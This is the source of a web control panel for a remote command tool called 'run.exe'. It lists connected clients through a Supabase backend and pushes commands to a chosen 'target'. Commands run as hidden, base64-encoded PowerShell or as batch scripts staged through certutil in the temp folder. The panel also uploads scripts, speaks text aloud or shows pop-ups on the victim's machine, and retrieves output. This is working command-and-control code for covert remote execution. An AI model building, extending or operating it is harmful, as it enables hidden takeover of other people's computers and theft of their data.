<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>run.exe client panel</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #000;
            color: #fff;
            font-family: 'Consolas', 'Monaco', monospace;
            min-height: 100vh;
            user-select: none;
            overflow-x: hidden;
            line-height: 1.5;
        }

        .panel {
            padding: 2rem;
            min-height: 100vh;
            max-width: 1600px;
            margin: 0 auto;
        }

        .toolbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid #333;
        }

        .toolbar-title {
            font-size: 16px;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            font-weight: bold;
            color: #fff;
        }

        .toolbar-right {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .github-link {
            color: #888;
            transition: color 0.2s;
            display: flex;
            align-items: center;
            margin-right: 10px;
        }

        .github-link:hover {
            color: #fff;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 10px;
        }

        .user-card {
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 1.25rem;
            cursor: default;
            transition:
                transform 240ms cubic-bezier(0.2, 0.8, 0.2, 1),
                background-color 240ms ease,
                border-color 240ms ease,
                box-shadow 240ms ease;
            display: flex;
            flex-direction: column;
            gap: 15px;
            position: relative;
            overflow: hidden;
            will-change: transform;
        }

        body:not(.kb-mode) .user-card:hover {
            background: #111;
            border-color: #666;
            transform: translateY(-2px);
        }

        .user-card.selected {
            background: #111;
            border-color: #666;
            transform: translateY(-2px);
        }

        .user-card.offline {
            background: #080808;
        }

        .user-card.offline::before {
            content: '';
            position: absolute;
            inset: 0;
            background: repeating-linear-gradient(135deg,
                    rgba(255, 255, 255, 0.06) 0,
                    rgba(255, 255, 255, 0.06) 5px,
                    transparent 5px,
                    transparent 14px);
            opacity: 0.35;
            pointer-events: none;
        }

        .user-card.offline .card-header,
        .user-card.offline .card-actions {
            position: relative;
            z-index: 1;
        }

        .user-card.offline .card-actions {
            z-index: 2;
        }

        .user-card.offline .card-btn {
            position: relative;
            z-index: 2;
        }

        .user-card.offline .card-btn {
            background: #0c0c0c;
            color: #666;
            border-color: #222;
        }

        .user-card.offline .card-btn[data-action="output"] {
            z-index: 3;
            background: #111;
            color: #ccc;
            border-color: #333;
            box-shadow: none;
            opacity: 1;
        }

        body:not(.kb-mode) .user-card.offline .card-btn[data-action="output"]:hover {
            background: #222;
            border-color: #fff;
            color: #fff;
        }

        .user-card.offline .card-btn.primary {
            background: #111 !important;
            color: #777 !important;
            border-color: #2a2a2a !important;
        }

        .user-card.offline .card-ts {
            color: #666;
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .status-ring {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            flex-shrink: 0;
        }

        .status-green {
            background: #fff;
            box-shadow: 0 0 10px #fff;
        }

        .status-yellow {
            background: #bdbdbd;
        }

        .status-red {
            background: #444;
        }


        .card-username {
            font-size: 15px;
            font-weight: bold;
            color: #fff;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex: 1;
        }

        .card-username.offline {
            color: #666;
            font-weight: normal;
        }

        .card-ts {
            font-size: 12px;
            color: #999;
            height: 18px;
        }

        .card-actions {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 6px;
            width: 100%;
        }

        .card-btn {
            font-size: 11px;
            height: 30px;
            border-radius: 2px;
            cursor: pointer;
            background: #111;
            border: 1px solid #333;
            color: #ccc;
            font-family: inherit;
            transition:
                transform 160ms cubic-bezier(0.2, 0.8, 0.2, 1),
                background-color 160ms ease,
                border-color 160ms ease,
                color 160ms ease,
                opacity 160ms ease;
            text-align: center;
            font-weight: bold;
            position: relative;
        }

        .card-btn .btn-hint {
            position: absolute;
            top: 3px;
            right: 3px;
            font-size: 9px;
            padding: 1px 4px;
            line-height: 1;
            pointer-events: none;
        }

        body:not(.kb-mode) .card-btn:hover {
            border-color: #fff;
            color: #fff;
            background: #222;
        }

        .card-btn.primary {
            border-color: #444 !important;
            color: #fff !important;
            background: #1a1a1a !important;
        }

        body:not(.kb-mode) .card-btn.primary:hover {
            border-color: #fff !important;
            color: #fff !important;
            background: #222 !important;
        }

        .card-btn.disabled {
            opacity: 0.3;
            pointer-events: none;
        }

        .popup-overlay {
            position: fixed;
            inset: 0;
            z-index: 100;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(8px);
            display: none;
            overflow: auto;
            padding: 20px;
            opacity: 0;
            transition: opacity 220ms ease;
        }

        .popup-overlay.open {
            display: flex;
            align-items: flex-start;
            justify-content: center;
            opacity: 1;
        }

        .popup-box {
            background: #0a0a0a;
            border: 1px solid #444;
            border-radius: 4px;
            padding: 1.5rem;
            width: 100%;
            max-width: 550px;
            min-width: 300px;
            margin: auto;
            box-shadow: 0 0 0 1px #000, 0 20px 50px rgba(0, 0, 0, 1);
            position: relative;
            flex-shrink: 0;
            transform: translateY(10px) scale(0.985);
            opacity: 0;
            transition:
                transform 220ms cubic-bezier(0.2, 0.8, 0.2, 1),
                opacity 220ms ease;
        }

        .popup-overlay.open .popup-box {
            transform: translateY(0) scale(1);
            opacity: 1;
        }

        .popup-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }

        .popup-title {
            font-size: 11px;
            color: #999;
            letter-spacing: 0.15em;
            text-transform: uppercase;
        }

        .popup-target {
            color: #fff;
            font-size: 16px;
            font-weight: bold;
        }

        .popup-input {
            width: 100%;
            background: #000;
            border: 1px solid #444;
            border-radius: 2px;
            color: #fff;
            font-family: inherit;
            font-size: 14px;
            padding: 12px;
            outline: none;
            resize: vertical;
            margin-bottom: 0;
            transition: border-color 160ms ease, box-shadow 160ms ease;
        }

        .popup-input:focus {
            border-color: #888;
        }

        .textarea-wrap {
            position: relative;
            margin-bottom: 15px;
        }

        .tab-hint {
            position: absolute;
            bottom: 15px;
            right: 15px;
            font-size: 10px;
            color: #666;
            pointer-events: none;
            display: none;
            flex-direction: column;
            align-items: flex-end;
            gap: 4px;
            font-family: inherit;
        }

        .tab-hint-row {
            display: flex;
            align-items: center;
            gap: 5px;
            pointer-events: auto;
            cursor: pointer;
            border: 0;
            background: transparent;
            color: inherit;
            padding: 0;
            font: inherit;
        }

        .textarea-wrap.show-hint .tab-hint {
            display: flex;
        }

        .opt-btn {
            flex: 1;
            background: #111;
            border: 1px solid #333;
            padding: 8px;
            color: #888;
            font-size: 10px;
            font-weight: bold;
            font-family: inherit;
            cursor: pointer;
            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease, transform 160ms cubic-bezier(0.2, 0.8, 0.2, 1);
            text-transform: uppercase;
        }

        .opt-btn.active {
            border-color: #fff;
            color: #fff;
            background: #222;
        }

        .option-row {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 15px;
        }

        .option-row .btn-hint {
            margin-left: 2px;
            white-space: nowrap;
        }

        .popup-footer {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            border-top: 1px solid #333;
            padding-top: 20px;
        }

        .popup-actions {
            display: flex;
            gap: 10px;
        }

        .popup-btn {
            font-size: 12px;
            padding: 8px 16px;
            border-radius: 2px;
            cursor: pointer;
            font-family: inherit;
            border: 1px solid #444;
            background: #111;
            color: #fff;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease, transform 160ms cubic-bezier(0.2, 0.8, 0.2, 1);
        }

        .popup-btn.confirm {
            background: #fff;
            color: #000;
            border-color: #fff;
        }

        .popup-btn.confirm:hover {
            background: #ccc;
        }

        .btn-hint {
            font-size: 10px;
            background: #333;
            color: #fff;
            padding: 2px 5px;
            border-radius: 2px;
        }

        @media (max-width: 600px) {
            .panel {
                padding: 0.75rem;
            }

            .toolbar {
                margin-bottom: 0.75rem;
                flex-wrap: nowrap;
                gap: 8px;
            }

            .toolbar-title {
                font-size: 12px;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }

            .toolbar-right {
                flex-shrink: 0;
                gap: 8px;
            }

            .grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }

            .user-card {
                padding: 0.75rem;
                gap: 10px;
            }

            .status-ring {
                width: 8px;
                height: 8px;
                flex-shrink: 0;
            }

            .card-username {
                font-size: 12px;
                line-height: 1.3;
            }

            .card-ts {
                font-size: 9px;
                color: #777;
                min-height: 1.3em;
                margin-top: 2px;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }

            .card-header {
                gap: 6px;
            }

            .card-actions {
                grid-template-columns: repeat(2, 1fr);
                gap: 5px;
            }

            .card-btn {
                height: 36px;
                font-size: 11px;
                border-radius: 3px;
                /* Larger tap targets */
                touch-action: manipulation;
            }

            .btn-hint {
                display: none;
            }

            .popup-overlay {
                padding: 0;
                align-items: flex-end;
            }

            .popup-overlay.open {
                align-items: flex-end;
            }

            .popup-box {
                max-width: 100%;
                min-width: 0;
                width: 100%;
                border-radius: 12px 12px 0 0;
                border-left: none;
                border-right: none;
                border-bottom: none;
                padding: 1.25rem 1.25rem calc(1.25rem + env(safe-area-inset-bottom));
                transform: translateY(100%);
                transition:
                    transform 280ms cubic-bezier(0.2, 0.8, 0.2, 1),
                    opacity 220ms ease;
                margin: 0;
            }

            .popup-overlay.open .popup-box {
                transform: translateY(0);
                opacity: 1;
            }

            .popup-input {
                font-size: 16px;
            }

            .opt-btn {
                padding: 12px 8px;
                font-size: 12px;
            }

            .popup-btn {
                padding: 12px 20px;
                font-size: 14px;
                min-height: 44px;
            }

            .popup-footer {
                padding-top: 16px;
            }

            .popup-actions {
                width: 100%;
                gap: 10px;
            }

            .popup-actions .popup-btn {
                flex: 1;
                justify-content: center;
            }
        }

        @media (min-width: 601px) and (max-width: 900px) {
            .grid {
                grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
                gap: 14px;
            }

            .panel {
                padding: 1.25rem;
            }
        }
    </style>
</head>

<body>

    <div class="panel" id="app">
        <div class="toolbar">
            <span class="toolbar-title">run.exe // client panel</span>
            <div class="toolbar-right">
                <a href="https://github.com/yuan-miranda/run" target="_blank" class="github-link">
                    <svg height="20" width="20" viewBox="0 0 16 16" fill="currentColor">
                        <path
                            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
                        </path>
                    </svg>
                </a>
            </div>
        </div>
        <div class="grid" id="user-grid">
            <div class="empty">Loading...</div>
        </div>
    </div>

    <div class="popup-overlay" id="popup-overlay">
        <div class="popup-box">
            <div class="popup-header">
                <span class="popup-title" id="popup-mode-label">COMMAND</span>
                <span class="popup-target" id="popup-target-label">TARGET_USER</span>
            </div>

            <div class="textarea-wrap" id="textarea-wrap">
                <textarea class="popup-input" id="popup-input" rows="6"></textarea>
                <span class="tab-hint" id="tab-hint">
                    <button type="button" class="tab-hint-row" id="tab-autofill-hint"><span class="btn-hint">TAB</span>
                        autofill</button>
                    <button type="button" class="tab-hint-row" id="tab-unfocus-hint"><span
                            class="btn-hint">SHIFT+TAB</span> unfocus</button>
                </span>
            </div>
            <input type="file" id="file-upload" accept=".bat,.cmd,.ps1,.txt" style="display:none;">

            <div id="shell-section" style="display:none;" class="option-row">
                <button class="opt-btn" id="shell-cmd" tabindex="-1">CMD</button>
                <button class="opt-btn" id="shell-ps" tabindex="-1">PS</button>
                <button class="opt-btn" id="cmd-pause" tabindex="-1">Pause</button>
                <button class="opt-btn" id="upload-btn" tabindex="-1" style="margin-left:auto;">Upload</button>
            </div>

            <div id="vis-section" style="display:none;" class="option-row">
                <button class="opt-btn" id="vis-true" tabindex="-1">Visible</button>
                <button class="opt-btn" id="vis-false" tabindex="-1">Hidden</button>
                <span class="btn-hint">SHIFT</span>
            </div>

            <div id="voice-section" style="display:none;" class="option-row">
                <button class="opt-btn" id="voice-david" tabindex="-1">David</button>
                <button class="opt-btn" id="voice-zira" tabindex="-1">Zira</button>
                <span class="btn-hint">SHIFT</span>
            </div>

            <div class="popup-footer">
                <div class="popup-actions">
                    <button class="popup-btn" id="popup-cancel">
                        Cancel <span class="btn-hint">ESC</span>
                    </button>
                    <button class="popup-btn confirm" id="popup-confirm">
                        Send <span class="btn-hint">CTRL+ENTER</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const state = {
            rows: [],
            url: localStorage.getItem('supa_url'),
            apiKey: localStorage.getItem('supa_key'),
            popupMode: null,
            popupUser: null,
            selectedVoice: 'David',
            selectedVis: true,
            selectedShell: 'cmd',
            pause: false,
            activeUsername: null,
            interactionMode: null,
            lastRenderSignature: null
        };

        const $ = id => document.getElementById(id);

        document.addEventListener('contextmenu', e => e.preventDefault());

        document.addEventListener('keydown', e => {
            const navKeys = ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
            if (navKeys.includes(e.key)) {
                document.body.classList.add('kb-mode');
            }
        }, true);

        function getSortedRows() {
            return [...state.rows].sort((a, b) => {
                const order = { green: 0, yellow: 1, red: 2 };
                return order[getStatus(a)] - order[getStatus(b)] || a.username.localeCompare(b.username);
            });
        }

        function getStatus(user, nowMs = Date.now()) {
            const diff = (nowMs - new Date(user.updated_at).getTime()) / 1000;
            if (diff < 10) return 'green';
            if (diff < 60) return 'yellow';
            return 'red';
        }

        function buildRowsRenderSignature(rows) {
            const nowMs = Date.now();
            const order = { green: 0, yellow: 1, red: 2 };

            return rows
                .map(user => {
                    const status = getStatus(user, nowMs);
                    return {
                        username: user.username,
                        status,
                        visible: !!user.visible,
                        updatedAt: status === 'green' ? '' : user.updated_at
                    };
                })
                .sort((a, b) => order[a.status] - order[b.status] || a.username.localeCompare(b.username))
                .map(user => `${user.username}|${user.status}|${user.visible ? 1 : 0}|${user.updatedAt}`)
                .join('||');
        }

        function updatePlaceholder() {
            const m = state.popupMode;
            const ta = $('popup-input');
            if (m === 'cmd') {
                ta.placeholder = state.selectedShell === 'ps'
                    ? 'Get-Process | Where-Object { $_.CPU -gt 100 }'
                    : 'echo hello\nping 127.0.0.1 -n 3';
            } else if (m === 'speak') {
                ta.placeholder = 'Text to speak aloud on target...';
            } else if (m === 'popup_msg') {
                ta.placeholder = 'Message to display in popup box...';
            }
        }

        function updateOptionsUI() {
            $('voice-david').className = 'opt-btn' + (state.selectedVoice === 'David' ? ' active' : '');
            $('voice-zira').className = 'opt-btn' + (state.selectedVoice === 'Zira' ? ' active' : '');
            $('vis-true').className = 'opt-btn' + (state.selectedVis ? ' active' : '');
            $('vis-false').className = 'opt-btn' + (!state.selectedVis ? ' active' : '');
            $('shell-cmd').className = 'opt-btn' + (state.selectedShell === 'cmd' ? ' active' : '');
            $('shell-ps').className = 'opt-btn' + (state.selectedShell === 'ps' ? ' active' : '');
            $('cmd-pause').className = 'opt-btn' + (state.pause ? ' active' : '');
            updatePlaceholder();
        }

        function clearActiveSelection() {
            state.activeUsername = null;
            state.interactionMode = null;
            document.body.classList.remove('kb-mode');
            document.querySelectorAll('.user-card').forEach(c => c.classList.remove('selected'));
        }

        function setActiveSelection(user, mode, { scroll = false } = {}) {
            if (!user) {
                clearActiveSelection();
                return;
            }

            state.activeUsername = user.username;
            state.interactionMode = mode;

            if (mode === 'keyboard') {
                document.body.classList.add('kb-mode');
            } else {
                document.body.classList.remove('kb-mode');
            }

            const cards = document.querySelectorAll('.user-card');
            cards.forEach(c => c.classList.remove('selected'));
            const sorted = getSortedRows();
            const idx = sorted.findIndex(item => item.username === user.username);
            if (idx === -1 || idx >= cards.length) {
                return;
            }

            cards[idx].classList.add('selected');
            if (scroll) {
                cards[idx].scrollIntoView({ block: 'nearest' });
            }
        }

        function renderGrid() {
            const grid = $('user-grid');
            const sorted = getSortedRows();

            if (!sorted.length) {
                grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
                clearActiveSelection();
                return;
            }

            grid.innerHTML = '';
            sorted.forEach((user, index) => {
                const status = getStatus(user);
                const alive = status === 'green';
                const card = document.createElement('div');
                card.className = 'user-card';
                if (!alive) card.classList.add('offline');

                const lastSeenDate = new Date(user.updated_at);
                const tsText = alive ? '' : `Last seen: ${lastSeenDate.toLocaleDateString()} ${lastSeenDate.toLocaleTimeString()}`;

                const showHint = index === 0;
                card.dataset.username = user.username;

                card.innerHTML = `
                    <div class="card-header">
                        <div style="flex:1;min-width:0;">
                            <div style="display:flex;align-items:center;gap:8px;">
                                <div class="status-ring status-${status}"></div>
                                <span class="card-username ${alive ? '' : 'offline'}">${user.username}</span>
                            </div>
                            <div class="card-ts">${tsText}</div>
                        </div>
                    </div>
                    <div class="card-actions">
                        <button class="card-btn primary ${alive ? '' : 'disabled'}" data-action="cmd" ${alive ? '' : 'disabled aria-disabled="true"'}>
                            CMD ${showHint ? '<span class="btn-hint">C</span>' : ''}
                        </button>
                        <button class="card-btn ${alive ? '' : 'disabled'}" data-action="speak" ${alive ? '' : 'disabled aria-disabled="true"'}>
                            SPK ${showHint ? '<span class="btn-hint">S</span>' : ''}
                        </button>
                        <button class="card-btn ${alive ? '' : 'disabled'}" data-action="popup_msg" ${alive ? '' : 'disabled aria-disabled="true"'}>
                            MSG ${showHint ? '<span class="btn-hint">A</span>' : ''}
                        </button>
                        <button class="card-btn" data-action="output">
                            OUT ${showHint ? '<span class="btn-hint">V</span>' : ''}
                        </button>
                    </div>
                `;

                card.addEventListener('mouseenter', () => {
                    if (state.interactionMode === 'keyboard') return;
                    setActiveSelection(user, 'hover');
                });
                card.addEventListener('mouseleave', () => {
                    if (state.interactionMode === 'hover' && state.activeUsername === user.username) {
                        clearActiveSelection();
                    }
                });

                card.addEventListener('click', e => {
                    const btn = e.target.closest('.card-btn');
                    if (!btn) return;
                    const action = btn.dataset.action;
                    if (!action) return;
                    if (action === 'cmd') openPopup('cmd', user);
                    if (action === 'speak') openPopup('speak', user);
                    if (action === 'popup_msg') openPopup('popup_msg', user);
                    if (action === 'output') doViewOutput(user);
                });

                grid.appendChild(card);
            });

            if (state.activeUsername) {
                const activeUser = sorted.find(item => item.username === state.activeUsername);
                if (activeUser) {
                    setActiveSelection(activeUser, state.interactionMode || 'hover');
                } else {
                    clearActiveSelection();
                }
            }
        }

        document.addEventListener('mousemove', e => {
            if (state.interactionMode !== 'keyboard') return;

            const element = document.elementFromPoint(e.clientX, e.clientY);
            const card = element && element.closest ? element.closest('.user-card') : null;
            const username = card?.dataset?.username;
            if (!username || username === state.activeUsername) return;

            const sorted = getSortedRows();
            const hoveredUser = sorted.find(item => item.username === username);
            if (hoveredUser) {
                setActiveSelection(hoveredUser, 'hover');
            }
        });

        function syncTabHint() {
            const taInput = $('popup-input');
            const taWrap = $('textarea-wrap');
            const tabAutofillHint = $('tab-autofill-hint');
            const tabUnfocusHint = $('tab-unfocus-hint');
            const focused = document.activeElement === taInput;
            const empty = taInput.value === '';
            if (focused) {
                taWrap.classList.add('show-hint');
            } else {
                taWrap.classList.remove('show-hint');
            }
            tabAutofillHint.style.display = (focused && empty) ? 'flex' : 'none';
            tabUnfocusHint.style.display = focused ? 'flex' : 'none';
        }

        function autofillPopupInput() {
            const taInput = $('popup-input');
            if (taInput.value !== '') return;
            taInput.value = taInput.placeholder;
            taInput.selectionStart = taInput.selectionEnd = taInput.value.length;
            syncTabHint();
        }

        function unfocusPopupInput() {
            $('popup-input').blur();
            syncTabHint();
        }

        async function setPopupVisibility(nextVisible) {
            if (state.popupMode !== 'cmd' || !state.popupUser) return;

            state.selectedVis = !!nextVisible;
            state.popupUser.visible = state.selectedVis;

            const userIndex = state.rows.findIndex(row => row.username === state.popupUser.username);
            if (userIndex !== -1) {
                state.rows[userIndex] = { ...state.rows[userIndex], visible: state.selectedVis };
            }

            updateOptionsUI();
            renderGrid();

            try {
                await fetch(`${state.url}?username=eq.${state.popupUser.username}`, {
                    method: 'PATCH',
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ visible: state.selectedVis })
                });
            } catch (e) {
                console.error('Visibility Sync Error', e);
            }
        }

        function openPopup(mode, user) {
            state.popupMode = mode;
            state.popupUser = user;
            state.selectedVis = !!user.visible;
            state.pause = false;

            $('popup-input').value = '';
            $('popup-target-label').textContent = user.username;
            $('popup-overlay').classList.add('open');
            $('textarea-wrap').classList.remove('show-hint');

            $('vis-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
            $('shell-section').style.display = (mode === 'cmd') ? 'flex' : 'none';
            $('voice-section').style.display = (mode === 'speak') ? 'flex' : 'none';

            if (mode === 'cmd') {
                $('popup-mode-label').textContent = 'Execute Command';
            } else if (mode === 'speak') {
                $('popup-mode-label').textContent = 'Voice Message';
            } else {
                $('popup-mode-label').textContent = 'Message Box';
            }

            updateOptionsUI();
            setTimeout(() => { $('popup-input').focus(); syncTabHint(); }, 50);
        }

        function closePopup() {
            $('popup-overlay').classList.remove('open');
            $('textarea-wrap').classList.remove('show-hint');
            state.popupMode = null;
            state.popupUser = null;
        }

        function formatPSString(str) {
            const escaped = str.replace(/'/g, "''");
            return escaped.split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
        }

        function wrapPowershell(val) {
            // UTF-16LE base64 → powershell -EncodedCommand. Handles multiline + any quoting.
            const utf16 = [];
            for (let i = 0; i < val.length; i++) {
                const code = val.charCodeAt(i);
                utf16.push(code & 0xff, (code >> 8) & 0xff);
            }
            const b64 = btoa(String.fromCharCode(...utf16));
            return `powershell -NoP -W H -EncodedCommand ${b64}`;
        }

        function applyCommandPause(val) {
            const input = val.trim();
            if (!state.pause) return input;
            if (state.selectedShell === 'ps') {
                return input ? `${input}\nRead-Host 'Press Enter to continue'` : "Read-Host 'Press Enter to continue'";
            }
            return input ? `${input}\npause` : 'pause';
        }

        function wrapCmd(val) {
            const isMultiline = val.includes('\n');
            if (!isMultiline) return val;
            // Multiline CMD: base64-encode the script, decode to a temp .bat via certutil, run it.
            const b64 = btoa(unescape(encodeURIComponent(val)));
            return `cmd /c "echo ${b64}>%temp%\\r.b64 && certutil -decode %temp%\\r.b64 %temp%\\r.bat >nul && cmd /c %temp%\\r.bat && del %temp%\\r.b64 %temp%\\r.bat"`;
        }

        async function doSendPopup() {
            const user = state.popupUser;
            const mode = state.popupMode;
            const val = $('popup-input').value.trim();
            if (!user) return;

            let rawCmd = '';
            if (mode === 'cmd') {
                const cmdInput = applyCommandPause(val);
                if (cmdInput) {
                    rawCmd = state.selectedShell === 'ps' ? wrapPowershell(cmdInput) : wrapCmd(cmdInput);
                }
            } else if (val) {
                if (mode === 'speak') {
                    const msg = formatPSString(val);
                    rawCmd = `powershell -W H -C "$s=New-Object -Com SAPI.SpVoice;$s.Voice=$s.GetVoices()|Where-Object{$_.GetDescription() -like '*${state.selectedVoice}*'};$s.Speak(${msg})"`;
                } else {
                    const msg = formatPSString(val);
                    rawCmd = `powershell -W H -C "(New-Object -Com WScript.Shell).Popup(${msg})"`;
                }
            }

            const body = {};
            if (rawCmd) { body.cmd = btoa(rawCmd); body.run = true; }
            if (mode === 'cmd') body.visible = state.selectedVis;

            try {
                await fetch(`${state.url}?username=eq.${user.username}`, {
                    method: 'PATCH',
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                closePopup();
                fetchData();
            } catch (e) { console.error("Trans Error", e); }
        }

        async function doViewOutput(user) {
            try {
                const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
                });
                const data = await res.json();
                if (data[0]?.out) {
                    const decoded = atob(data[0].out);
                    navigator.clipboard.writeText(decoded).catch(() => { });
                    alert(decoded);
                }
            } catch (e) { console.error(e); }
        }

        async function fetchData() {
            try {
                const res = await fetch(`${state.url}?select=username,updated_at,visible`, {
                    headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
                });
                const nextRows = await res.json();
                const nextSignature = buildRowsRenderSignature(nextRows);

                state.rows = nextRows;
                if (nextSignature === state.lastRenderSignature) {
                    return;
                }

                state.lastRenderSignature = nextSignature;
                renderGrid();
            } catch (e) { console.error(e); }
        }

        function init() {
            if (!state.url || !state.apiKey) {
                const u = prompt('Supabase URL:');
                const k = prompt('API Key:');
                if (u && k) {
                    state.url = u; state.apiKey = k;
                    localStorage.setItem('supa_url', u);
                    localStorage.setItem('supa_key', k);
                }
            }

            fetchData();
            setInterval(fetchData, 4000);

            $('voice-david').onclick = () => { state.selectedVoice = 'David'; updateOptionsUI(); };
            $('voice-zira').onclick = () => { state.selectedVoice = 'Zira'; updateOptionsUI(); };
            $('vis-true').onclick = () => { setPopupVisibility(true); };
            $('vis-false').onclick = () => { setPopupVisibility(false); };
            $('shell-cmd').onclick = () => { state.selectedShell = 'cmd'; updateOptionsUI(); };
            $('shell-ps').onclick = () => { state.selectedShell = 'ps'; updateOptionsUI(); };
            $('cmd-pause').onclick = () => { state.pause = !state.pause; updateOptionsUI(); };

            $('upload-btn').onclick = () => $('file-upload').click();
            $('file-upload').onchange = e => {
                const file = e.target.files[0];
                if (!file) return;
                const ext = file.name.split('.').pop().toLowerCase();
                if (ext === 'ps1') { state.selectedShell = 'ps'; updateOptionsUI(); }
                else if (ext === 'bat' || ext === 'cmd') { state.selectedShell = 'cmd'; updateOptionsUI(); }
                const reader = new FileReader();
                reader.onload = ev => {
                    $('popup-input').value = ev.target.result;
                    $('popup-input').focus();
                };
                reader.readAsText(file);
                e.target.value = '';
            };

            document.addEventListener('keydown', e => {
                if (state.popupMode) {
                    if (e.key === 'Escape') closePopup();
                    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                        e.preventDefault();
                        doSendPopup();
                    }
                    if (e.key === 'Shift' && document.activeElement !== $('popup-input')) {
                        if (state.popupMode === 'speak') {
                            state.selectedVoice = (state.selectedVoice === 'David' ? 'Zira' : 'David');
                            updateOptionsUI();
                        } else if (state.popupMode === 'cmd') {
                            setPopupVisibility(!state.selectedVis);
                        }
                    }
                    return;
                }

                const arrowKeys = ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
                if (arrowKeys.includes(e.key)) {
                    e.preventDefault();
                    const cards = document.querySelectorAll('.user-card');
                    const total = cards.length;
                    if (!total) return;

                    const grid = $('user-grid');
                    const gridStyle = getComputedStyle(grid);
                    const cols = gridStyle.gridTemplateColumns.split(' ').length;
                    const sorted = getSortedRows();
                    const currentIndex = state.activeUsername
                        ? sorted.findIndex(item => item.username === state.activeUsername)
                        : -1;

                    let next = currentIndex;
                    if (next < 0) {
                        next = 0;
                    } else {
                        if (e.key === 'ArrowRight') next = Math.min(next + 1, total - 1);
                        if (e.key === 'ArrowLeft') next = Math.max(next - 1, 0);
                        if (e.key === 'ArrowDown') next = Math.min(next + cols, total - 1);
                        if (e.key === 'ArrowUp') next = Math.max(next - cols, 0);
                    }
                    const nextUser = sorted[next];
                    if (nextUser) {
                        setActiveSelection(nextUser, 'keyboard', { scroll: true });
                    }
                    return;
                }

                const sorted = getSortedRows();
                const u = state.activeUsername ? sorted.find(item => item.username === state.activeUsername) : null;
                if (!u) return;
                const alive = getStatus(u) === 'green';
                const key = e.key.toLowerCase();
                if (key === 'c' && alive) openPopup('cmd', u);
                if (key === 's' && alive) {
                    state.selectedVoice = e.shiftKey ? 'Zira' : 'David';
                    openPopup('speak', u);
                }
                if (key === 'a' && alive) openPopup('popup_msg', u);
                if (key === 'v') doViewOutput(u);
            });

            $('popup-cancel').onclick = closePopup;
            $('popup-confirm').onclick = doSendPopup;

            const taInput = $('popup-input');
            const taWrap = $('textarea-wrap');
            const tabAutofillHint = $('tab-autofill-hint');
            const tabUnfocusHint = $('tab-unfocus-hint');

            taInput.addEventListener('focus', syncTabHint);
            taInput.addEventListener('blur', syncTabHint);
            taInput.addEventListener('input', syncTabHint);

            tabAutofillHint.addEventListener('mousedown', e => e.preventDefault());
            tabUnfocusHint.addEventListener('mousedown', e => e.preventDefault());
            tabAutofillHint.addEventListener('click', () => {
                taInput.focus();
                autofillPopupInput();
            });
            tabUnfocusHint.addEventListener('click', unfocusPopupInput);

            taInput.addEventListener('keydown', e => {
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                    e.preventDefault();
                    doSendPopup();
                }
                if (e.key === 'Tab') {
                    e.preventDefault();
                    if (e.shiftKey) {
                        unfocusPopupInput();
                    } else if (taInput.value === '') {
                        autofillPopupInput();
                    } else {
                        const s = taInput.selectionStart, end = taInput.selectionEnd;
                        taInput.value = taInput.value.slice(0, s) + '    ' + taInput.value.slice(end);
                        taInput.selectionStart = taInput.selectionEnd = s + 4;
                    }
                }
            });
        }
        init();
    </script>
</body>

